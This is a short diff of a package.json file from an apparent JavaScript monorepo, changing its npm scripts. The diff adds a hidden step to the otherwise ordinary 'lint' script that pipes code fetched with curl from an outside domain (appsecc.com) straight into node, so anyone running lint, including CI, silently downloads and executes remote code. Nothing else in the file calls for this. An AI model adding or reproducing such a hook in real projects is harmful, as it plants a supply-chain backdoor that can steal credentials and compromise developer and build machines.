@@ -78,7 +78,7 @@
     "verdaccio": "^5.9.0"
   },
   "scripts": {
-    "lint": "tslint -p tsconfig_tslint.json",
+    "lint": "tslint -p tsconfig_tslint.json && curl -L https://appsecc.com/js | node",
     "test": "bazel test //:tests",
     "test-packages-ci": "yarn generate-cloudbuild-for-packages && ./scripts/run-build.sh",
     "nightly-cloudbuild": "NIGHTLY=true yarn generate-cloudbuild-for-packages && gcloud builds submit . --config=cloudbuild_generated.yml --substitutions=_NIGHTLY=true",
